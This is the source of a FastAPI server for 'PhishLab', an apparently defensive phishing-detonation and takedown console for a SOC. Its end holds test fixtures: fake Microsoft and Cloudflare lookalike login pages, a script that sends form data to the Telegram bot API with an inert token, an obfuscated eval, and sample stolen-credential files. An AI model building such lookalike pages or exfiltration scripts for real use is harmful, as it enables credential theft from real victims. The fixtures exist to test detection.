"""api.py — PhishLab local API + GUI host.

Serves the single-page detonation console and runs detonations. Bind to localhost on the isolated
SOC PC. The detonate endpoint intentionally visits the untrusted URL (that is the tool's job) — run
it only on the dedicated detonation host.
"""
from __future__ import annotations

import asyncio
import sys

# Windows + Playwright: the browser launches as a subprocess, which the default SelectorEventLoop cannot
# spawn (-> NotImplementedError, detonations fail with 0 steps). Force the Proactor loop at import time,
# before uvicorn builds its event loop, so browser launches work under the server just like asyncio.run().
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

import hashlib
import ipaddress
import os
import re
from base64 import b64encode
from pathlib import Path
from urllib.parse import urlsplit

from fastapi import FastAPI, File, Form, Request, UploadFile
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, Response
from pydantic import BaseModel, Field

def _load_dotenv() -> None:
    """Minimal .env loader (no dep) — holds optional secrets like NordVPN creds / API keys; gitignored.
    Drop a `.env` in EITHER the PhishLab root folder OR backend/ and it's picked up automatically
    (backend/.env wins on conflicts; real OS env vars still win over both, via setdefault)."""
    here = Path(__file__).parent
    for p in (here / ".env", here.parent / ".env"):    # backend/.env first, then the repo-root .env
        if not p.exists():
            continue
        text = ""
        for enc in ("utf-8-sig", "utf-16", "utf-8", "latin-1"):
            try:
                text = p.read_text(encoding=enc)
                break
            except Exception:
                continue
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))


_load_dotenv()

from phishlab import mailbox as M        # noqa: E402  (import after .env is loaded)
from phishlab import mailparse as MP     # noqa: E402
from phishlab import net_guard as G      # noqa: E402
from phishlab import phishtank as PT     # noqa: E402
from phishlab import report as R         # noqa: E402
from phishlab import reporter as RPT      # noqa: E402  (human-assisted VT/HA/FortiGuard abuse reporting)
from phishlab import sb_session as SB    # noqa: E402  (SeleniumBase/Chrome — the default engine)
from phishlab import session as S        # noqa: E402  (Camoufox — proxy/decloak backup, PHISH_ENGINE=camoufox)
from phishlab import tracker as T        # noqa: E402
from phishlab import updater as U        # noqa: E402


def _detonate(url: str):
    """Start a live detonation with the configured engine. Default = SeleniumBase/Chrome (solves
    Cloudflare, streams screenshots); PHISH_ENGINE=camoufox uses the legacy Camoufox session."""
    if (os.getenv("PHISH_ENGINE") or "seleniumbase").strip().lower() == "camoufox":
        return S.create(url)
    return SB.create(url)
from phishlab.kit import ART_DIR         # noqa: E402
from phishlab.sandbox import detonate    # noqa: E402

app = FastAPI(title="PhishLab", version="0.1.0")
WEB = Path(__file__).parent / "web"

_ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"} | {
    h.strip().lower() for h in (os.getenv("PHISH_ALLOWED_HOSTS") or "").split(",") if h.strip()}


def _host_ok(host: str) -> bool:
    if not host or host in _ALLOWED_HOSTS:
        return True
    try:                                    # allow LAN access (bound 0.0.0.0) via any private/loopback IP
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback
    except ValueError:
        return False                        # a domain-name Host that isn't allowlisted -> reject (rebind defence)


@app.middleware("http")
async def _host_guard(request, call_next):
    """DNS-rebinding defence — a malicious page can rebind its name to a private IP but its Host header
    stays the attacker domain, so serve only localhost / LAN-IP / allowlisted Hosts. LAN IP literals are
    allowed (for homie testing on 0.0.0.0); domain names must be in PHISH_ALLOWED_HOSTS."""
    host = (request.headers.get("host") or "").rsplit(":", 1)[0].strip().lower().strip("[]")
    if not _host_ok(host):
        return JSONResponse({"error": "forbidden host"}, status_code=403)
    return await call_next(request)


class DetonateReq(BaseModel):
    url: str = Field(min_length=1, max_length=4000)


@app.get("/")
async def index() -> HTMLResponse:
    # no-store so the browser never serves a stale GUI after an update
    return HTMLResponse((WEB / "index.html").read_text(encoding="utf-8"),
                        headers={"Cache-Control": "no-store, max-age=0"})


@app.get("/api/health")
async def health() -> dict:
    return {"ok": True, "service": "phishlab"}


@app.get("/api/version")
async def version() -> dict:
    """A hash of the current GUI — the page polls this and auto-reloads itself when it changes,
    so UI updates never need a manual hard-refresh."""
    try:
        v = hashlib.md5((WEB / "index.html").read_bytes()).hexdigest()[:12]
    except Exception:
        v = "0"
    return {"v": v}


def _cross_origin(request: Request) -> bool:
    """True for a CROSS-ORIGIN browser request — a drive-by CSRF vector. A malicious page's fetch() to
    127.0.0.1 sends Sec-Fetch-Site: cross-site/same-site; the GUI sends same-origin; non-browser callers
    (curl) send nothing. Block only the cross-origin browser case so state-changing update endpoints can't
    be triggered by a tab the analyst happens to have open."""
    return (request.headers.get("sec-fetch-site") or "").lower() in ("cross-site", "same-site")


@app.get("/api/update/check")
async def update_check() -> dict:
    """Is a newer PhishLab commit available on GitHub? Drives the 'update available' badge."""
    return await asyncio.to_thread(U.check)      # git ls-remote is blocking — keep it off the event loop


@app.post("/api/update/apply")
async def update_apply(request: Request):
    """Pull the latest from GitHub (fast-forward only). If backend code changed, the GUI then calls
    /api/update/restart to relaunch with the new code."""
    if _cross_origin(request):
        return JSONResponse({"error": "cross-origin request blocked"}, status_code=403)
    return await asyncio.to_thread(U.apply)      # git fetch/pull is blocking (up to ~180s) — off-loop


@app.post("/api/update/restart")
async def update_restart(request: Request):
    """Cleanly restart the engine so a pulled backend update takes effect. Exits with code 42 a moment
    AFTER this response is sent; start.bat's loop relaunches on 42 (installs without a manual restart)."""
    if _cross_origin(request):
        return JSONResponse({"error": "cross-origin request blocked"}, status_code=403)
    import threading
    import time

    def _bye():
        time.sleep(0.8)          # let this response flush + any in-flight frame settle
        os._exit(42)             # hard exit with the 'relaunch me' code the .bat loop watches for

    threading.Thread(target=_bye, daemon=True).start()
    return {"restarting": True}


class OpenReq(BaseModel):
    url: str


@app.post("/api/open-native")
async def open_native(req: OpenReq, request: Request):
    """Open a URL in the analyst's REAL default browser on the external SOC box (manual inspection).
    http/https only; cross-origin-guarded so a stray tab can't pop browser windows."""
    if _cross_origin(request):
        return JSONResponse({"error": "cross-origin request blocked"}, status_code=403)
    raw = (req.url or "").strip()
    m = re.match(r"^([a-zA-Z][\w+.-]*):", raw)                # explicit scheme? reject file:/javascript:/etc.
    if m and m.group(1).lower() not in ("http", "https"):
        return JSONResponse({"error": "only http/https URLs can be opened"}, status_code=400)
    url = _norm_url(raw)
    if not (url.startswith("http://") or url.startswith("https://")):
        return JSONResponse({"error": "only http/https URLs can be opened"}, status_code=400)
    try:
        os.startfile(url)                    # Windows: hand to the default browser
        return {"ok": True, "url": url}
    except Exception:
        try:
            import webbrowser
            return {"ok": bool(webbrowser.open(url)), "url": url}
        except Exception as exc:
            return JSONResponse({"error": f"{type(exc).__name__}: {exc}"[:120]}, status_code=500)


@app.get("/api/artifact")
async def artifact(path: str):
    """Download a recovered kit artifact — path-traversal guarded to the artifacts dir."""
    ap = os.path.abspath(path)
    if not ap.startswith(os.path.abspath(ART_DIR) + os.sep) or not os.path.isfile(ap):
        return JSONResponse({"error": "not found"}, status_code=404)
    return FileResponse(ap, filename=os.path.basename(ap), media_type="application/octet-stream")


@app.post("/api/detonate")
async def api_detonate(req: DetonateReq):
    if not (req.url or "").strip():
        return JSONResponse({"error": "Enter a URL to detonate."}, status_code=400)
    url = _norm_url(req.url)     # refangs hxxps://evil[.]com -> https://evil.com
    err = _guard(url)
    if err:
        return JSONResponse({"error": err}, status_code=400)
    try:
        return await detonate(url)
    except Exception as exc:  # detonation of a live/hostile page can fail many ways — report it
        return JSONResponse({"error": f"Detonation failed — {type(exc).__name__}: {exc}"[:300]},
                            status_code=500)


# ── live interactive session (Phase 4b) ───────────────────────────────────────
_DEFANG = [(r"h[x*]{2}ps", "https"), (r"h[x*]{2}p", "http"), (r"\[\.\]", "."), (r"\(\.\)", "."),
           (r"\{\.\}", "."), (r"\[dot\]", "."), (r"\(dot\)", "."), (r"\[:\]", ":"), (r"\[/\]", "/")]


def _refang(u: str) -> str:
    """Turn a threat-intel-defanged URL (hxxps://evil[.]com) back into a real one so it can be pasted
    straight from a report/urlscan into the console."""
    u = (u or "").strip().strip("<>").strip()
    for pat, rep in _DEFANG:
        u = re.sub(pat, rep, u, flags=re.I)
    return u


def _norm_url(u: str) -> str:
    u = _refang(u)
    return u if u.lower().startswith(("http://", "https://")) else "http://" + u


def _is_own_console(url: str) -> bool:
    """The PhishLab console page itself (localhost root) — detonating it just scans our own demo data."""
    try:
        sp = urlsplit(url)
        return (sp.hostname in ("127.0.0.1", "localhost", "::1")
                and (sp.path or "/") in ("/", "/index.html"))
    except Exception:
        return False


_OWN_CONSOLE_MSG = ("That's the PhishLab console itself — enter a suspect URL to analyse, "
                    "or try the built-in test kit at /demo-phish/.")


def _guard(url: str) -> str | None:
    """Reason string if the URL must be refused (own console or an internal/SSRF target); else None."""
    if _is_own_console(url):
        return _OWN_CONSOLE_MSG
    ok, why = G.check_target(url)
    if not ok:
        return (f"Refused — {why}. PhishLab only detonates public targets "
                "(set PHISH_ALLOW_INTERNAL=1 to override for an internal test range).")
    return None


@app.post("/api/session")
async def session_start(req: DetonateReq):
    """Start a LIVE detonation session; returns its id. Poll /state + /frame; POST /input + /resume."""
    url = _norm_url(req.url)
    if not url or url in ("http://", "https://"):
        return JSONResponse({"error": "Enter a URL to detonate."}, status_code=400)
    err = _guard(url)
    if err:
        return JSONResponse({"error": err}, status_code=400)
    s = _detonate(url)
    return {"id": s.id, "state": s.state}


@app.get("/api/session/{sid}")
async def session_state(sid: str):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    return s.snapshot_state()


@app.get("/api/session/{sid}/frame")
async def session_frame(sid: str):
    s = S.get(sid)
    if not s or s.latest_frame is None:
        return Response(status_code=204)
    return Response(content=s.latest_frame, media_type="image/jpeg",
                    headers={"Cache-Control": "no-store"})


class InputEv(BaseModel):
    type: str
    x: float | None = None
    y: float | None = None
    dx: float | None = None      # scroll deltas — were being stripped, so take-over scrolling did nothing
    dy: float | None = None
    key: str | None = None
    text: str | None = None


@app.post("/api/session/{sid}/input")
async def session_input(sid: str, ev: InputEv):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    await s.forward(ev.model_dump())
    return {"ok": True}


@app.post("/api/session/{sid}/takeover")
async def session_takeover(sid: str):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    s.request_takeover()
    return {"ok": True, "state": s.state}


@app.post("/api/session/{sid}/resume")
async def session_resume(sid: str):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    s.resume()
    return {"ok": True, "state": s.state}


@app.post("/api/session/{sid}/cancel")
async def session_cancel(sid: str):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    if hasattr(s, "cancel"):
        s.cancel()
    return {"ok": True, "state": getattr(s, "state", "cancelled")}


@app.get("/api/session/{sid}/report.html")
async def session_report_html(sid: str):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    host = (s.report.get("url") or "site").split("//")[-1].split("/")[0]
    return HTMLResponse(R.build_html(s.report),
                        headers={"Content-Disposition": f'attachment; filename="phishlab-{host}.html"'})


@app.get("/api/session/{sid}/report.md")
async def session_report_md(sid: str):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    return Response(R.build_markdown(s.report), media_type="text/markdown")


@app.get("/api/session/{sid}/targets")
async def session_targets(sid: str):
    s = S.get(sid)
    if not s:
        return JSONResponse({"error": "no such session"}, status_code=404)
    return {"targets": R.takedown_targets(s.report)}


class ReportReq(BaseModel):
    url: str
    target: str
    detail: str | None = None      # pre-filled report message (e.g. the Telegram bot/chat evidence)


@app.post("/api/report")
async def report_start(req: ReportReq):
    """Open a takedown report form in a live, take-over-able session (for CAPTCHA-gated submits)."""
    url = _norm_url(req.url)
    if req.target not in S.REPORT_FORMS:
        return JSONResponse({"error": "unknown report target"}, status_code=400)
    s = S.create_report(url, req.target, (req.detail or "").strip()[:1500] or None)
    return {"id": s.id, "state": s.state, "target": req.target}


# ── takedown tracker (Phase 5b) ───────────────────────────────────────────────
class TrackReq(BaseModel):
    url: str
    name: str | None = None
    verdict: str | None = None
    score: int | None = None


class RenameReq(BaseModel):
    url: str
    name: str


@app.on_event("startup")
async def _startup():
    T.start()
    M.start(lambda url: _detonate(url).id)   # Gmail intake -> auto-detonate (dormant w/o creds)


@app.get("/api/mail/queue")
async def mail_queue():
    return {"enabled": M.enabled(), "interval": M.INTERVAL, "items": M.QUEUE[:40]}


class MailReq(BaseModel):
    url: str


@app.post("/api/mail/dismiss")
async def mail_dismiss(req: MailReq):
    """Drop an intake item — it's been marked phishing (now a case) or a false positive."""
    return {"ok": M.dismiss(req.url)}


@app.get("/api/tracker/trace")
async def tracker_trace(url: str):
    """Network-level proof (ping + curl) for a tracked case."""
    return await T.network_trace(_norm_url(url))


@app.get("/api/tracker")
async def tracker_list():
    return {"sites": await T.all_sites(), "interval": T.PING_INTERVAL}


@app.post("/api/tracker")
async def tracker_add(req: TrackReq):
    url = _norm_url(req.url)
    return {"ok": True, "site": await T.add(url, req.name, req.verdict, req.score)}


@app.post("/api/tracker/rename")
async def tracker_rename(req: RenameReq):
    return {"site": await T.rename(_norm_url(req.url), req.name)}


@app.post("/api/tracker/confirm")
async def tracker_confirm(url: str):
    return {"site": await T.confirm_down(_norm_url(url))}


class ViewsReq(BaseModel):
    url: str


@app.post("/api/tracker/views")
async def tracker_views(req: ViewsReq):
    """Render the case from every vantage (direct + proxies) → per-vantage screenshots as proof."""
    return {"views": await T.capture_views(_norm_url(req.url))}


@app.post("/api/tracker/check")
async def tracker_check(url: str):
    return {"site": await T.check(_norm_url(url))}


@app.delete("/api/tracker")
async def tracker_remove(url: str):
    return {"ok": await T.remove(_norm_url(url))}


# ── PhishTank reporting poller ────────────────────────────────────────────────
# Report a suspect URL to PhishTank (under the team account, default ""), then WATCH here:
# PhishLab polls the reporter's PhishTank user page every ~60s (up to 2h) until the URL is ingested, then
# surfaces its phish_detail.php link to copy into WhatsApp for the takedown thread.
class PTWatchReq(BaseModel):
    url: str = Field(min_length=1, max_length=4000)
    username: str | None = None
    interval: int | None = None
    max_hours: float | None = None


@app.post("/api/phishtank/watch")
async def pt_watch(req: PTWatchReq):
    url = _norm_url(req.url)
    if not url or url in ("http://", "https://"):
        return JSONResponse({"error": "Enter a URL to watch."}, status_code=400)
    w = PT.start_watch(url, req.username, req.interval or 30, req.max_hours or 2)
    return w.snapshot()


@app.get("/api/phishtank/watches")
async def pt_watches():
    return {"watches": [w.snapshot() for w in PT.list_watches()], "default_user": PT.USER_DEFAULT}


@app.post("/api/phishtank/watch/{wid}/stop")
async def pt_stop(wid: str):
    w = PT.stop_watch(wid)
    if not w:
        return JSONResponse({"error": "no such watch"}, status_code=404)
    return w.snapshot()


@app.get("/api/phishtank/check")
async def pt_check(url: str, username: str | None = None):
    """One-shot: is this URL already on PhishTank (under the reporter)? Returns the detail link if so."""
    hit, rows = await PT.find_for_url(_norm_url(url), username or PT.USER_DEFAULT)
    return {"hit": hit, "recent": rows[:8], "default_user": PT.USER_DEFAULT}


# ── phishing email / attachment analysis ──────────────────────────────────────
# Upload a .eml / Outlook .msg (or a loose .pdf/.html) → extract every candidate URL (email body, PDF
# text + PDF QR codes, HTML) so the analyst can detonate each via the standard engine. Files are parsed
# / rendered only — NEVER executed. The raw upload is retained briefly so later reporting can push the
# attachments to Hybrid Analysis / VirusTotal.
EMAIL_ANALYSES: dict = {}
_EMAIL_CAP = 20


def _evict_email():
    if len(EMAIL_ANALYSES) > _EMAIL_CAP:
        for k in sorted(EMAIL_ANALYSES, key=lambda k: EMAIL_ANALYSES[k]["at"])[:len(EMAIL_ANALYSES) - _EMAIL_CAP]:
            EMAIL_ANALYSES.pop(k, None)


@app.post("/api/email/analyze")
async def email_analyze(file: UploadFile = File(...)):
    """Parse an uploaded phishing email / attachment → headers + all candidate links (with source)."""
    data = await file.read()
    if not data:
        return JSONResponse({"error": "Empty file."}, status_code=400)
    if len(data) > 30_000_000:
        return JSONResponse({"error": "File too large (30 MB max)."}, status_code=400)
    parsed = await asyncio.to_thread(MP.parse, data, file.filename or "")
    import time as _time
    import uuid as _uuid
    aid = _uuid.uuid4().hex[:12]
    EMAIL_ANALYSES[aid] = {"data": data, "filename": file.filename or "upload",
                           "parsed": parsed, "at": _time.time()}
    _evict_email()
    return {"id": aid, **parsed}


# ── human-assisted abuse reporting (VirusTotal / Hybrid Analysis / FortiGuard) ────────────────
# Drives the REAL scanner page in a Chrome window (same SeleniumBase engine as detonation), auto-solves a
# basic checkbox CAPTCHA, hands image/word challenges to the analyst, then screenshots the results page.
# A URL goes to VirusTotal / FortiGuard; a PDF/.html attachment goes to Hybrid Analysis (file upload).
class ReportStartReq(BaseModel):
    service: str = Field(min_length=1, max_length=32)
    url: str = Field(min_length=1, max_length=4000)


@app.post("/api/report/start")
async def report_scanner_start(req: ReportStartReq):
    service = (req.service or "").strip().lower()
    if service not in RPT.SERVICES:
        return JSONResponse({"error": f"Unknown service '{service}'."}, status_code=400)
    url = _norm_url(req.url)
    err = _guard(url)                                     # keep the public-only discipline (no internal hosts)
    if err:
        return JSONResponse({"error": err}, status_code=400)
    s = RPT.create_url(service, url)
    return {"id": s.id, "state": s.state, "service": service}


@app.post("/api/report/start-file")
async def report_scanner_start_file(service: str = Form(...), file: UploadFile = File(...)):
    service = (service or "").strip().lower()
    if service not in RPT.SERVICES:
        return JSONResponse({"error": f"Unknown service '{service}'."}, status_code=400)
    if not RPT.SERVICES[service].get("supports_file"):
        return JSONResponse({"error": f"{RPT.SERVICES[service]['label']} takes a URL, not a file."}, status_code=400)
    data = await file.read()
    if not data:
        return JSONResponse({"error": "Empty file."}, status_code=400)
    if len(data) > 100_000_000:
        return JSONResponse({"error": "File too large (100 MB max)."}, status_code=400)
    s = RPT.create_file(service, data, file.filename or "sample.bin")
    return {"id": s.id, "state": s.state, "service": service}


@app.post("/api/report/start-file-from/{aid}/{idx}")
async def report_scanner_start_from_analysis(aid: str, idx: int, service: str = Form(...)):
    """Report an attachment that was already parsed by /api/email/analyze (no re-upload) — used by the
    'Report to Hybrid Analysis' button next to a PDF/.html attachment in the email view."""
    service = (service or "").strip().lower()
    if service not in RPT.SERVICES or not RPT.SERVICES[service].get("supports_file"):
        return JSONResponse({"error": "Service can't take a file."}, status_code=400)
    rec = EMAIL_ANALYSES.get(aid)
    if not rec:
        return JSONResponse({"error": "Analysis expired — re-upload the email/file."}, status_code=404)
    # re-parse from the stored raw bytes to recover the attachment payload at the requested index
    payloads = await asyncio.to_thread(MP.attachment_payloads, rec["data"], rec.get("filename", ""))
    if idx < 0 or idx >= len(payloads):
        return JSONResponse({"error": "No such attachment."}, status_code=404)
    name, blob = payloads[idx]
    if not blob:
        return JSONResponse({"error": "Attachment had no extractable bytes."}, status_code=400)
    s = RPT.create_file(service, blob, name)
    return {"id": s.id, "state": s.state, "service": service}


@app.post("/api/report/{sid}/capture")
async def report_capture(sid: str):
    s = S.get(sid)
    if not s or not hasattr(s, "capture"):
        return JSONResponse({"error": "no such report session"}, status_code=404)
    s.capture()
    return {"ok": True, "state": s.state}


@app.get("/api/report/recent")
async def report_recent():
    """Latest VT / Hybrid Analysis / FortiGuard capture per service (recent) — screenshot + permalink +
    parsed score + real file hashes — feeds the detonation report's evidence gallery."""
    return {"reports": RPT.recent_reports()}


@app.get("/api/report/{sid}/shot")
async def report_shot(sid: str):
    """The saved results screenshot PNG (download / copy). Served only from the reports dir."""
    if not re.fullmatch(r"[a-f0-9]{6,32}", sid or ""):
        return JSONResponse({"error": "bad id"}, status_code=400)
    for svc in RPT.SERVICES:
        p = os.path.join(RPT.REPORTS_DIR, f"{svc}_{sid}.png")
        if os.path.isfile(p):
            return FileResponse(p, filename=os.path.basename(p), media_type="image/png",
                                headers={"Cache-Control": "no-store"})
    return JSONResponse({"error": "not captured yet"}, status_code=404)


# ── built-in EXAMPLE phishing kit (safe, self-hosted) to test the walker end-to-end ─────────────
# Detonate http://127.0.0.1:8090/demo-phish/  — a multi-step Microsoft-lookalike: login -> a "please
# wait 60 seconds" interstitial -> an OTP step -> a done page whose source carries a Telegram exfil
# token + obfuscation + a kit-author marker (so the code analyzer + walker light up).
_PHISH_CSS = ("<style>body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;margin:0}"
              ".box{max-width:420px;margin:8vh auto;background:#fff;padding:44px;"
              "box-shadow:0 2px 8px rgba(0,0,0,.13)}h1{font-size:23px;font-weight:600;margin:.2em 0}"
              "input{width:100%;padding:11px;margin:9px 0;border:1px solid #ccc;box-sizing:border-box}"
              "button{background:#0067b8;color:#fff;border:0;padding:10px 22px;float:right;cursor:pointer}"
              ".logo{color:#0067b8;font-weight:700;font-size:17px}p{color:#444}</style>")
def _demo_tg(bot_id: str, tag: str) -> str:
    """Inert FAKE Telegram token for the offline demo fixtures — assembled at runtime so the full
    <id>:<secret> literal never appears in source (GitHub secret scanning matches the contiguous shape).
    NOT a real bot; only exists so the Telegram-exfil extractor has something to find."""
    return f"{bot_id}:{tag}1234567890abcdefghijklmnopqrstuv"


_TG = _demo_tg("8123456789", "AAG")

_PHISH_LOGIN = ("<!doctype html><html><head><title>Sign in to your Microsoft account</title>" + _PHISH_CSS +
                "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Sign in</h1>"
                "<form method='POST' action='/demo-phish/verify'>"
                "<input type='email' name='loginfmt' placeholder='Email, phone, or Skype' required>"
                "<input type='password' name='passwd' placeholder='Password' required>"
                "<button type='submit'>Sign in</button></form></div></body></html>")
_PHISH_WAIT = ("<!doctype html><html><head><title>Verifying your account…</title>" + _PHISH_CSS +
               "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Please wait</h1>"
               "<p>We are verifying your account. This can take up to <b>60 seconds</b>. "
               "Do not close this window.</p><p style='color:#888'>Redirecting in "
               "<span id='c'>60</span> seconds…</p><script>var n=60,e=document.getElementById('c');"
               "var t=setInterval(function(){n-=6;if(n<0)n=0;e.textContent=n;"
               "if(n<=0){clearInterval(t);location.href='/demo-phish/otp';}},1000);"
               "</script></div></body></html>")
_PHISH_OTP = ("<!doctype html><html><head><title>Enter security code — Microsoft</title>" + _PHISH_CSS +
              "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Verify your identity</h1>"
              "<p>We texted a code to your phone. Enter it to continue.</p>"
              "<form method='POST' action='/demo-phish/done'>"
              "<input type='text' name='otc' inputmode='numeric' placeholder='Enter code' required>"
              "<button type='submit'>Verify</button></form></div></body></html>")
_PHISH_DONE = ("<!doctype html><html><head><title>Account verified — Microsoft</title>" + _PHISH_CSS +
               "</head><body><div class='box'><div class='logo'>Microsoft</div>"
               "<h1>Thanks — you're verified</h1><p>You're all set. You can close this window.</p>"
               "<!-- coded by m1rr0r -->"
               "<script>var _b='" + _TG + "';var tg={chat_id:'987654321'};var _c=tg.chat_id;"
               "function ship(d){fetch('https://api.telegram.org/bot'+_b+'/sendMessage?chat_id='+_c"
               "+'&text='+encodeURIComponent(d));}eval(atob('dmFyIF94PTE7'));</script>"
               "</div></body></html>")
_PHISH_PAGES = {"": _PHISH_LOGIN, "verify": _PHISH_WAIT, "otp": _PHISH_OTP, "done": _PHISH_DONE}


@app.api_route("/demo-phish/{page:path}", methods=["GET", "POST"])
async def demo_phish(page: str = ""):
    return HTMLResponse(_PHISH_PAGES.get(page.strip("/"), _PHISH_LOGIN))


# Detonate http://127.0.0.1:8090/demo-cfphish/ — reproduces Cloudflare's "Suspected Phishing" WARNING
# interstitial (the blocklist page): an "Ignore & Proceed" link + a "Verify you are human" checkbox.
# Tests the walker's auto-clear (extract.is_cf_phish_warning -> browser.pass_cf_phish_warning): it should
# click Ignore & Proceed and land on the real (fake) Microsoft login behind it, then detonate that.
# NB: the checkbox here is an ordinary demo checkbox, NOT a genuine Cloudflare Turnstile (that iframe is
# CF-hosted and can't be self-served) — so this fixture exercises detection + the Ignore & Proceed path;
# the Turnstile-click path only runs against a real Cloudflare page (needs Camoufox's real fingerprint).
_CFPHISH_WARN = (
    "<!doctype html><html><head><meta charset='utf-8'><title>Suspected Phishing</title>"
    "<style>body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;color:#313131;margin:0}"
    ".box{max-width:760px;margin:9vh auto;padding:0 20px}h1{font-size:30px;font-weight:600;margin:.1em 0 .5em}"
    ".warn{color:#d64b3f;font-weight:700;font-size:15px}.desc{color:#4a4a4a;line-height:1.6;font-size:15px}"
    ".acts{margin:22px 0}.btn{background:#2b2b2b;color:#fff;padding:9px 16px;border-radius:3px;"
    "text-decoration:none;font-size:14px;margin-right:16px}a.proceed{color:#d64b3f;font-size:14px}"
    ".cf-turnstile{margin:18px 0;border:1px solid #e0e0e0;border-radius:4px;background:#fafafa;"
    "max-width:300px;padding:12px 14px;display:flex;align-items:center;gap:10px}"
    ".cf-turnstile input{width:20px;height:20px}.ray{color:#8a8a8a;font-size:12px;margin-top:40px;"
    "border-top:1px solid #eee;padding-top:12px}</style></head><body><div class='box'>"
    "<div class='warn'>&#9888; Warning</div><h1>Suspected Phishing</h1>"
    "<p class='desc'><b>This website has been reported for potential phishing.</b><br>"
    "Phishing is when a site attempts to steal sensitive information by falsely presenting as a safe source.</p>"
    "<div class='acts'><a class='btn' href='https://www.cloudflare.com/phishing/' target='_blank'>Learn More</a>"
    "<a class='proceed' href='/demo-cfphish/site'>Ignore &amp; Proceed</a></div>"
    "<div class='cf-turnstile'><input type='checkbox'><span>Verify you are human</span>"
    "<span style='margin-left:auto;color:#f38020;font-weight:700'>CLOUDFLARE</span></div>"
    "<div class='ray'>Cloudflare Ray ID: <b>a183f0fead64401a</b> &middot; Performance &amp; security by Cloudflare</div>"
    "</div></body></html>")
_CFPHISH_SITE = ("<!doctype html><html><head><title>Sign in to your account</title>" + _PHISH_CSS +
                 "</head><body><div class='box'><div class='logo'>Microsoft</div><h1>Sign in</h1>"
                 "<form method='POST' action='/demo-cfphish/done'>"
                 "<input type='email' name='loginfmt' placeholder='Email, phone, or Skype' required>"
                 "<input type='password' name='passwd' placeholder='Password' required>"
                 "<button type='submit'>Sign in</button></form></div></body></html>")
_CFPHISH_PAGES = {"": _CFPHISH_WARN, "site": _CFPHISH_SITE,
                  "done": "<!doctype html><h1>Account verified</h1>"}


@app.api_route("/demo-cfphish/{page:path}", methods=["GET", "POST"])
async def demo_cfphish(page: str = ""):
    return HTMLResponse(_CFPHISH_PAGES.get(page.strip("/"), _CFPHISH_WARN))


# Detonate http://127.0.0.1:8090/demo-lead/ — a marketing/lead-capture funnel (First/Last/Phone/Email,
# NO password) that links to a SEPARATE real credential login. Tests the walker's login-vs-lead-capture
# detection: it should classify the lead form, skip it, follow 'Member Login', and fill the real login.
_LEAD_LANDING = ("<!doctype html><html><head><title>Free Crypto Masterclass — CryptoKnight</title>" + _PHISH_CSS +
                 "</head><body><div class='box'><div class='logo'>CryptoKnight</div>"
                 "<h1>Exclusive Show-Up Bonus</h1><p>Register for the free 2-hour masterclass.</p>"
                 "<form method='POST' action='/demo-lead/thanks'>"
                 "<input type='text' name='fname' placeholder='First Name' required>"
                 "<input type='text' name='lname' placeholder='Last Name' required>"
                 "<input type='tel' name='phone' placeholder='Phone' required>"
                 "<input type='email' name='email' placeholder='Email' required>"
                 "<button type='submit'>Register now</button></form>"
                 "<p style='margin-top:18px;font-size:13px'>Already a member? "
                 "<a href='/demo-lead/login'>Member Login</a></p></div></body></html>")
_LEAD_LOGIN = ("<!doctype html><html><head><title>Member Login — CryptoKnight</title>" + _PHISH_CSS +
               "</head><body><div class='box'><div class='logo'>CryptoKnight</div><h1>Member Login</h1>"
               "<form method='POST' action='/demo-lead/dashboard'>"
               "<input type='email' name='email' placeholder='Email' required>"
               "<input type='password' name='password' placeholder='Password' required>"
               "<button type='submit'>Log in</button></form></div></body></html>")
_LEAD_PAGES = {"": _LEAD_LANDING, "login": _LEAD_LOGIN,
               "thanks": "<!doctype html><h1>Thanks — see you there!</h1>",
               "dashboard": "<!doctype html><h1>Dashboard</h1>"}


@app.api_route("/demo-lead/{page:path}", methods=["GET", "POST"])
async def demo_lead(page: str = ""):
    return HTMLResponse(_LEAD_PAGES.get(page.strip("/"), _LEAD_LANDING))


# Detonate http://127.0.0.1:8090/demo-opendir/ — a sloppily-deployed kit with an EXPOSED open directory
# whose files use NON-STANDARD names (results_x9f.txt, not results.txt) that the fixed probes miss. Only
# the open-directory RECURSION finds them → recovers the victim credential log + kit source + a subdir.
_OD_LISTING = ("<html><head><title>Index of /demo-opendir</title></head><body><h1>Index of /demo-opendir</h1><pre>"
               "<a href='../'>Parent Directory</a>\n"
               "<a href='results_x9f.txt'>results_x9f.txt</a>     4.1K\n"
               "<a href='index.php'>index.php</a>               8.0K\n"
               "<a href='sub/'>sub/</a>                     -\n</pre></body></html>")
_OD_SUB = ("<html><head><title>Index of /demo-opendir/sub</title></head><body><h1>Index of /demo-opendir/sub</h1>"
           "<pre><a href='../'>Parent Directory</a>\n<a href='panel_dump.log'>panel_dump.log</a>   2.0K\n</pre></body></html>")
_OD_CREDS = "victim1@corp.com:Passw0rd!\nvictim2@corp.com:Hunter2!\nfinance@corp.com:Spring2024\n"
_OD_SRC = "<?php $to=$_POST['email']; $pw=$_POST['pass']; file_get_contents('https://api.telegram.org/...'); ?>"
_OD_PAGES = {"": _OD_LISTING, "results_x9f.txt": _OD_CREDS, "index.php": _OD_SRC,
             "sub": _OD_SUB, "sub/": _OD_SUB, "sub/panel_dump.log": "admin@kit-panel.com:kitmaster99\n"}


